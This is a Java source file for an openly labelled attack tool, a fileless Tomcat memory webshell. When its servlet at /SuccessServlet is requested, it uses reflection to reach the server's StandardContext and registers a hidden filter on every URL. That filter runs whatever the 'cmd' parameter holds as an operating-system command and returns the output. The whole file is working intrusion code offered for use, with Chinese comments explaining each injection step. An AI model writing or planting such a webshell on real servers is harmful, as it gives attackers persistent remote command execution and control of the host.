package tomcatShell.Filter;

import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.*;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;

import java.util.Map;
import java.util.Scanner;

/**
 * 攻击用的内存马
 */

@WebServlet("/SuccessServlet")
public class FilterShell extends HttpServlet {
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {


//        org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
//        org.apache.catalina.webresources.StandardRoot standardroot = (org.apache.catalina.webresources.StandardRoot) webappClassLoaderBase.getResources();
//        org.apache.catalina.core.StandardContext standardContext = (StandardContext) standardroot.getContext();
//该获取StandardContext测试报错
        Field Configs = null;
        Map filterConfigs;
        try {
            //这里是反射获取 ApplicationContext 的 context，也就是 standardContext
            ServletContext servletContext = request.getSession().getServletContext();

            Field appctx = servletContext.getClass().getDeclaredField("context");
            appctx.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

            Field stdctx = applicationContext.getClass().getDeclaredField("context");
            stdctx.setAccessible(true);
            StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);



            String FilterName = "cmd_Filter";
            Configs = standardContext.getClass().getDeclaredField("filterConfigs");
            Configs.setAccessible(true);
            filterConfigs = (Map) Configs.get(standardContext);

            if (filterConfigs.get(FilterName) == null){
                Filter filter = new Filter() {

                    @Override
                    public void init(FilterConfig filterConfig) throws ServletException {

                    }

                    @Override
                    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                        HttpServletRequest req = (HttpServletRequest) servletRequest;
                        if (req.getParameter("cmd") != null){

                            InputStream in = Runtime.getRuntime().exec(req.getParameter("cmd")).getInputStream();
//
                            Scanner s = new Scanner(in).useDelimiter("\\A");
                            String output = s.hasNext() ? s.next() : "";
                            servletResponse.getWriter().write(output);

                            return;
                        }
                        filterChain.doFilter(servletRequest,servletResponse);
                    }

                    @Override
                    public void destroy() {

                    }
                };
                //反射获取 FilterDef，设置 filter 名等参数后，调用 addFilterDef 将 FilterDef 添加
                Class<?> FilterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
                Constructor declaredConstructors = FilterDef.getDeclaredConstructor();
                FilterDef o = (FilterDef) declaredConstructors.newInstance();
                o.setFilter(filter);
                o.setFilterName(FilterName);
                o.setFilterClass(filter.getClass().getName());
                standardContext.addFilterDef(o);
                //反射获取 FilterMap 并且设置拦截路径，并调用 addFilterMapBefore 将 FilterMap 添加进去
                Class<?> FilterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                Constructor<?> declaredConstructor = FilterMap.getDeclaredConstructor();
                org.apache.tomcat.util.descriptor.web.FilterMap o1 = (FilterMap)declaredConstructor.newInstance();

                o1.addURLPattern("/*");
                o1.setFilterName(FilterName);
                o1.setDispatcher(DispatcherType.REQUEST.name());
                standardContext.addFilterMapBefore(o1);

                //反射获取 ApplicationFilterConfig，构造方法将 FilterDef 传入后获取 filterConfig 后，将设置好的 filterConfig 添加进去
                Class<?> ApplicationFilterConfig = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
                Constructor<?> declaredConstructor1 = ApplicationFilterConfig.getDeclaredConstructor(Context.class,FilterDef.class);
                declaredConstructor1.setAccessible(true);
                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) declaredConstructor1.newInstance(standardContext,o);
                filterConfigs.put(FilterName,filterConfig);
                response.getWriter().write("Success");


            }
        } catch (Exception e) {
            e.printStackTrace();
        }




    }

    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        this.doPost(request, response);
    }
}

